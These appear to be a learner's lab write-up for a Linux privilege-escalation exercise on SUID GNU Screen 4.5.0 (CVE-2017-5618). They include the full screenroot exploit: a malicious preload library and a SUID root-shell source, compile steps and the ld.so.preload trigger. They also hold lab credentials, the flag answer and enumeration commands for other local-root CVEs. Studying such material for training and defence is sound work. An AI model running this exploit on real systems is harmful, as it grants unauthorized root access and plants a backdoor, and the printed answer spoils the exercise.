# Section 12 — Vulnerable Services (Screen 4.5.0 — CVE-2017-5618)

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/screen_exploit/flag.txt` via Screen exploit | **`91927dad55ffd22825660da88f2f92e0`** |

Exploited **SUID `screen-4.5.0`** (CVE-2017-5618) → `uid=0(root)` → read the root-only flag.

---

## Concept

Installed services/binaries with known CVEs = privesc. The classic: **GNU Screen 4.5.0** ships **SUID root** and doesn't drop privileges before opening its `-L` logfile → an attacker makes SUID-screen write an attacker-controlled `/etc/ld.so.preload`, then any SUID binary loads a malicious `.so` as root.

---

## Identify

```bash
screen -v                                   # "Screen version 4.05.00" = vulnerable
ls -la /usr/bin/screen*                      # MUST be SUID (-rwsr-xr-x)
find / -perm -4000 -type f 2>/dev/null | grep -i screen
which gcc cc                                 # need a compiler on-box (or compile elsewhere)
```
> ⚠️ The SUID binary is often **`screen-4.5.0`** with `/usr/bin/screen` symlinked to it — the exploit calls `screen` (the symlink works). Confirm the **SUID bit** (`s`), not just the version — a non-SUID 4.5.0 isn't exploitable here.

---

## Exploit (infodox screenroot — non-interactive adaptation used here)

Run as one script on the target (needs `gcc`):

```bash
cd /tmp
cat > /tmp/libhax.c <<'C'
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__)) void dropshell(void){
    chown("/tmp/rootshell", 0, 0);          // make our shell root-owned
    chmod("/tmp/rootshell", 04755);         // ...and SUID
    unlink("/etc/ld.so.preload");           // clean the preload trigger
}
C
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
cat > /tmp/rootshell.c <<'C'
int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp("/bin/sh", NULL, NULL); }
C
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"   # SUID screen writes /etc/ld.so.preload
screen -ls                                                     # trigger: SUID screen loads libhax.so as root
# interactive: /tmp/rootshell      # non-interactive (scripted/SSH):
echo 'id; cat /root/screen_exploit/flag.txt' | /tmp/rootshell
```
> **How it works:** SUID `screen` runs as root and writes its log to `/etc/ld.so.preload` with content `\n/tmp/libhax.so`. The next SUID `screen -ls` invocation, started by the dynamic loader, preloads `libhax.so` **as root** → its `__constructor__` makes `/tmp/rootshell` a SUID-root shell and deletes `/etc/ld.so.preload`. `/tmp/rootshell` then = instant root.
> **Headless tweak:** `/tmp/rootshell` execs `/bin/sh` with no args (interactive). Over a non-interactive SSH command, **pipe the command into it**: `echo 'cmd' | /tmp/rootshell` — `/bin/sh` reads stdin and runs it as root. (Same trick as escaping rbash / Nagios shells earlier.)

**Cleanup (do this — you left a SUID-root backdoor otherwise):**
```bash
echo 'rm -f /tmp/rootshell /tmp/libhax.so /etc/ld.so.preload' | /tmp/rootshell
```
> `/tmp/rootshell` is now world-exec SUID-root — anyone on the box gets root until removed. Remove it (and `libhax.so`/`ld.so.preload`) **via the rootshell itself** (your low-priv user can't delete a root-owned file). The constructor already unlinks `ld.so.preload`, but clean defensively.

---

## Generalising "vulnerable services"

```bash
# version-check installed software vs known local-root CVEs
dpkg -l 2>/dev/null | grep -iE 'screen|exim|nagios|samba|proftpd|sudo|polkit|pkexec|snapd|dbus'
sudo -V | head -1                  # CVE-2021-3156 Baron Samedit
pkexec --version                   # CVE-2021-4034 PwnKit (polkit) - near-universal
ls -la /usr/lib/snapd; snap version # dirty_sock CVE-2019-7304
searchsploit <service> <version>   # then read+understand the PoC before running
```
> Reflex: enumerate versions (§3) → map to local-root CVEs. Heavy hitters on these boxes: **Screen 4.5.0 (CVE-2017-5618)**, **PwnKit/pkexec (CVE-2021-4034)**, **Baron Samedit/sudo (CVE-2021-3156)**, **DirtyPipe (CVE-2022-0847)**. Understand impact before firing on prod (kernel/service exploits can crash hosts).

---

## Exam / Engagement Notes

- `screen -v` = 4.05.00 **and** SUID → CVE-2017-5618. Call the **symlink** `screen`; confirm `s` bit.
- Need `gcc` on-box; if absent, compile the 2 tiny C files on an identical-arch host and transfer the `.so`/binary.
- Non-interactive root shells from these PoCs: **`echo 'cmd' | /tmp/rootshell`**.
- **Always clean SUID-root droppers** via the rootshell — they're backdoors; note in report.
- Don't tunnel on Screen — also check pkexec/sudo/snapd versions; PwnKit is the most reliable modern universal local root.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. screen -v -> 4.05.00 ; ls -la /usr/bin/screen* -> screen-4.5.0 SUID ; which gcc
3. run screenroot (compile libhax.so + rootshell, screen -D -m -L ld.so.preload ..., screen -ls)
4. echo 'cat /root/screen_exploit/flag.txt' | /tmp/rootshell
   -> 91927dad55ffd22825660da88f2f92e0      ✅
5. echo 'rm -f /tmp/rootshell /tmp/libhax.so /etc/ld.so.preload' | /tmp/rootshell   # cleanup
```

> One line: SUID Screen 4.5.0 writes `/etc/ld.so.preload`; next SUID screen preloads our `.so` as root → SUID rootshell → flag (then clean the backdoor).
